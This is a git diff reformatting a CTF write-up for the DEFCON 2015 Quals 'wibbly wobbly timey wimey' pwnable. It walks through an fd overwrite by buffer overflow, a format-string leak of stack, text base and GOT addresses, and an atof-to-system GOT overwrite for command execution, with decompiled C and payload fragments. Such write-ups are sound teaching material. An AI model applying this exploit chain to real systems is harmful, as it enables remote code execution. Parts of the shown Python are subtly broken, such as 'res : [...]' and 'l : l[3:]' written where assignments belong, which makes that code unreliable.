@@ -1,18 +1,15 @@
 ---
 type: ctf
-title : DEFCON CTF 2015 Quals - wibbly wobbly timey wimey
+title: DEFCON CTF 2015 Quals - wibbly wobbly timey wimey
 tags: [DEFCON CTF, wibbly  timey]
-date : 2015-05-23
+date: 2015-05-23
 author: Eno
 featuredImage:
 ---
 
-**Category:** Pwnable
-**Points:** 2
-> Wibbly Wobbly Timey Wimey
-> Don't blink!
-> wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me:2606
+**Category:** Pwnable **Points:** 2
 
+> Wibbly Wobbly Timey Wimey Don't blink! wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me:2606
 
 32 bit ELF, with **Partial RELRO**, **stack canary found**, **NX** & **PIE** enabled.  
 First we'll have to play a game:
@@ -23,31 +20,35 @@ Go through the exits(E) to get to the next room and continue your search.
 But, most importantly, don't blink!
    012345678901234567890
 00                    E
-01                     
-02  A                  
-03               A     
-04 A                   
-05                     
-06               A     
-07                A    
-08                     
-09        V       A    
-10                  A  
-11                A    
-12              A      
-13                     
-14       A      A      
-15                     
-16                     
-17                     
-18                     
-19                     
+01
+02  A
+03               A
+04 A
+05
+06               A
+07                A
+08
+09        V       A
+10                  A
+11                A
+12              A
+13
+14       A      A
+15
+16
+17
+18
+19
 Your move (w,a,s,d,q):
 ```
 
-We'll have to control `V` with **wasd**, and the goal is to reach the `E` without being touched by those `A`s. In the final stage, `E` will be changed to `T`, and we'll win the game by reaching `T`. After we beat the game, it will ask us to input a `TARDIS KEY`. At this moment, teammate **yench** started writing a python script to beat the game, while me and other teammates try to figure out what is the `TARDIS KEY`.
+We'll have to control `V` with **wasd**, and the goal is to reach the `E` without being touched by those `A`s. In the
+final stage, `E` will be changed to `T`, and we'll win the game by reaching `T`. After we beat the game, it will ask us
+to input a `TARDIS KEY`. At this moment, teammate **yench** started writing a python script to beat the game, while me
+and other teammates try to figure out what is the `TARDIS KEY`.
 
 We found the following C code:
+
 ```c
 signed int sub_EB8()
 {
@@ -77,18 +78,20 @@ signed int sub_EB8()
 }
 ```
 
-So it looks like the `TARDIS KEY` is a 10-byte-long string, which every character is the machine code in `sub_EB8()`, and the machine code should be an **alpha-numeric character** after it does the `& 0x7F` operation. After we dump the machine code and wrote a script to extract the correct byte, we got the `TARDIS KEY` : `"UeSlhCAGEp"`.  
+So it looks like the `TARDIS KEY` is a 10-byte-long string, which every character is the machine code in `sub_EB8()`,
+and the machine code should be an **alpha-numeric character** after it does the `& 0x7F` operation. After we dump the
+machine code and wrote a script to extract the correct byte, we got the `TARDIS KEY` : `"UeSlhCAGEp"`.
 
 ```
 TARDIS KEY: UeSlhCAGEp
 Welcome to the TARDIS!
-Your options are: 
+Your options are:
 1. Turn on the console
 2. Leave the TARDIS
 Selection:
-```  
+```
 
-Looks like it only gave us 2 options. But after we reverse the binary, we found that it actually has 3 options. 
+Looks like it only gave us 2 options. But after we reverse the binary, we found that it actually has 3 options.
 
 ```c
  if ( LOBYTE(dword_50B0[0]) == '3' ) //dword_50B0[0] == our input
@@ -135,6 +138,7 @@ BOOL sub_E08()
 ```
 
 and we can only write `dword_50A4` in function `sub_BCB()`:
+
 ```c
 size_t sub_BCB()
 {
@@ -165,15 +169,20 @@ size_t sub_BCB()
 }
 ```
 
-Notice that `dword_50B0[2]` is the **fd**, and `dword_50B0[0]` is our **input buffer**(where the program store our **options**). By overflowing `dword_50B0[0]`, we can overwrite the value stored in `dword_50B0[2]` (the initial value is **3**, we'll have to overwrite it to **0**(`stdin`) so we can write our input into `dword_50A4`). 
+Notice that `dword_50B0[2]` is the **fd**, and `dword_50B0[0]` is our **input buffer**(where the program store our
+**options**). By overflowing `dword_50B0[0]`, we can overwrite the value stored in `dword_50B0[2]` (the initial value is
+**3**, we'll have to overwrite it to **0**(`stdin`) so we can write our input into `dword_50A4`).
 
 To sum up, here are the steps for enabling the option 3:
+
 1. Overwrite the **fd** (`dword_50B0[2]`) into **0** by overflowing `dword_50B0[0]`
-2. Write the value into `dword_50A4` so it can pass the checking function `sub_E08()`. Notice that `sub_BCB()` is called by sending the `SIGALARM` signal, so be aware of the timing.
+2. Write the value into `dword_50A4` so it can pass the checking function `sub_E08()`. Notice that `sub_BCB()` is called
+   by sending the `SIGALARM` signal, so be aware of the timing.
 3. Select option **1**, for turning on the TARDIS console.
 4. Option 3 will be enabled successfully after we turn on a TARDIS console.
 
 Here's the payload:
+
 ```python
 print t.recvuntil("Selection: ")
 log.info("overwriting fd...")
@@ -192,7 +201,8 @@ t.recvuntil("Coordinates: ")
 log.success("choice 3 enabled success")
 ```
 
-After we successfully enable option 3, let's see what does it do: 
+After we successfully enable option 3, let's see what does it do:
+
 ```c
 int choice3()
 {
@@ -236,15 +246,22 @@ int choice3()
 }
 ```
 
-So it will let us input our coordinates, and check the coordinates' value. If the coordinates are **(51.492137, -0.192878)**, it will trigger the **format string vulnerability**. After leaking some messages, we found that we're able to leak the **stack address**. This is very important, since the binary has the **PIE** & **Partial RELRO** protection, we don't know where the text's base address is, neither functions' GOT address. But if we can leak the stack address, we can calculate the location that stored the return address, **and leak the return address to calculate the text's base address.** After we have the text's base address, we can **calculate the functions' GOT address, and leak the function pointer.** After we got all the memory address, we can use the format string vulnerability to overwrite `atof`'s GOT entry into `system`'s address, and execute our command by entering our commands as the coordinates.
+So it will let us input our coordinates, and check the coordinates' value. If the coordinates are **(51.492137,
+-0.192878)**, it will trigger the **format string vulnerability**. After leaking some messages, we found that we're able
+to leak the **stack address**. This is very important, since the binary has the **PIE** & **Partial RELRO** protection,
+we don't know where the text's base address is, neither functions' GOT address. But if we can leak the stack address, we
+can calculate the location that stored the return address, **and leak the return address to calculate the text's base
+address.** After we have the text's base address, we can **calculate the functions' GOT address, and leak the function
+pointer.** After we got all the memory address, we can use the format string vulnerability to overwrite `atof`'s GOT
+entry into `system`'s address, and execute our command by entering our commands as the coordinates.
 
 So to sum up:
+
 1. Leak the stack address and calculate the return address' location
 2. Leak the return address and calculate the text's base address
 3. Calculate `atof`'s GOT and leak the function pointer
 4. Calculate `system`'s address and overwrite `atof`'s GOT entry
 5. Input coordinates **"[command], [garbage]"** to execute our commands
-    
 
 Here's the exploit. The part that beating the game was done by **yench**, while the rest was done by me.
 
@@ -267,11 +284,11 @@ def getMap(s):
 	MAP=MAP[len(MAP)-479:]
 	sql=MAP.split('\n')
 	i=0
-	res : [[] for x in range(20)] 
+	res : [[] for x in range(20)]
 	for l in sql:
 		l : l[3:]
 		res[i]=l
-		i+=1 
+		i+=1
 	return res
 
 def getChar(c,MAP):
@@ -328,7 +345,7 @@ for test in range(1000):
 				drct+='w'
 			else:
 				drct+='s'
-			
+
 	print drct
 	t.send(drct[0]+'\n')
 
